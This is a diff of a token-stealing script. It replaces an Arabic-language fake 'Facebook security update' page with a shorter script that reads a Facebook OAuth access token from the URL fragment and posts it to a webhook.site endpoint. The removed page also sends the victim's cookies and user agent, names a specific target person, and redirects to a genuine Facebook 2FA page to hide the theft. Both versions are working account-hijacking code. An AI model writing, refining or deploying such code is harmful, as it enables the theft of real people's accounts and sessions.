@@ -1,39 +1,15 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <title>تحديث أمان فيسبوك</title>
-</head>
-<body style="background-color: #f0f2f5; font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
-    <script>
-        (function() {
-            // 1. استخراج التوكن من رابط الـ Redirect
-            const hash = window.location.hash;
-            let capturedToken = "لم يتم العثور على توكن";
-            if (hash.includes('access_token=')) {
-                capturedToken = hash.split('access_token=')[1].split('&')[0];
-            }
-
-            // 2. إرسال البيانات فوراً إلى Webhook.site
-            // تم استبدال Pipedream لضمان السرعة كما طلبت
-            fetch('https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({
-                    token: capturedToken,
-                    cookie: document.cookie,
-                    ua: navigator.userAgent,
-                    account_target: "Khaled Houshan"
-                })
-            });
-
-            // 3. منع ظهور خطأ 404 عبر التوجيه لصفحة حقيقية بعد ثانيتين
-            setTimeout(function() {
-                window.location.href = "https://www.facebook.com/security/2fa/setup/intro/";
-            }, 2000);
-        })();
-    </script>
-    <h2>جاري فحص حالة الأمان...</h2>
-    <p>يرجى الانتظار لحظة، سيتم تحويلك تلقائياً.</p>
-</body>
-</html>
+// استخراج التوكن من الـ URL Fragment
+const hash = window.location.hash;
+if (hash.includes('access_token=')) {
+    const token = hash.split('access_token=')[1].split('&')[0];
+    
+    // إرسال التوكن إلى الرابط الخاص بك
+    fetch('https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190', {
+        method: 'POST',
+        body: JSON.stringify({
+            captured_token: token,
+            report_ref: "924595693574152",
+            timestamp: new Date().toISOString()
+        })
+    });
+}
